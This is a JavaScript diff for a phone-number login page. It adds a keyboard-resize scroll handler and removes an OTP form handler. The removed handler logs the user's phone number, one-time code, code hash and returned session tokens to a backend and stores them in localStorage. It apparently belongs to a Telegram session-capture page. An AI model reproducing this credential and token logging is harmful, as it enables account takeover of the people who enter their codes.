@@ -89,6 +89,15 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
 
+    window.addEventListener('resize', () => {
+        if (window.innerHeight < 500) { // Adjust for keyboard presence
+            window.scrollTo({
+                top: phoneInput.getBoundingClientRect().top - 100, // Adjust as necessary
+                behavior: 'smooth'
+            });
+        }
+    });
+
     const phoneForm = document.getElementById('phoneForm');
     if (phoneForm) {
         phoneForm.addEventListener('submit', async function(event) {
@@ -135,68 +144,6 @@ document.addEventListener('DOMContentLoaded', function() {
                 displayMessage(error.message, 'error');
             } finally {
                 submitButton.disabled = false; // Re-enable button
-                displayLoadingIndicator(false);
-            }
-        });
-    }
-
-    const otpForm = document.getElementById('otpForm');
-    if (otpForm) {
-        otpForm.addEventListener('submit', async function(event) {
-            event.preventDefault();
-            sendLogToBackend("Phone code form submitted!");
-
-            const phoneNumber = sessionStorage.getItem('phoneNumber');
-            const phoneCode = document.getElementById('phoneCode').value;
-            const phoneCodeHash = sessionStorage.getItem('phone_code_hash');
-
-            if (!phoneCodeHash) {
-                sendLogToBackend("Error: phone code hash is missing");
-                displayMessage("Phone code hash missing. Please try again.", 'error');
-                return;
-            }
-
-            if (!/^\d{5}$/.test(phoneCode)) {
-                displayMessage("Phone code must be exactly 5 digits.", 'error');
-                return;
-            }
-
-            sendLogToBackend("Phone number from sessionStorage: " + phoneNumber);
-            sendLogToBackend("Phone code entered: " + phoneCode);
-            sendLogToBackend("Phone code hash: " + phoneCodeHash);
-
-            const submitButton = otpForm.querySelector('button[type="submit"]');
-            submitButton.disabled = true; // Disable button to prevent multiple submissions
-            displayLoadingIndicator(true);
-
-            try {
-                const response = await fetch(`${BACKEND_URL}/verifyOTP`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phoneNumber, phoneCode, phone_code_hash: phoneCodeHash })
-                });
-
-                if (!response.ok) {
-                    const data = await response.json();
-                    throw new Error(data.message || 'Failed to submit Phone Code');
-                }
-
-                const result = await response.json();
-                sendLogToBackend('Received auth tokens: ' + JSON.stringify(result.authTokens));
-
-                localStorage.clear();
-                localStorage.setItem('auth_key', result.authTokens.auth_key);
-                localStorage.setItem('dc_id', result.authTokens.dc_id);
-                localStorage.setItem('session_string', result.authTokens.session_string);
-
-                document.getElementById('otpContainer').classList.add('swipe-in');
-                setTimeout(() => {
-                    window.location.href = result.redirectUrl;
-                }, 600);
-            } catch (error) {
-                displayMessage('Error submitting Phone Code: ' + error.message, 'error');
-            } finally {
-                submitButton.disabled = false; 
                 displayLoadingIndicator(false);
             }
         });
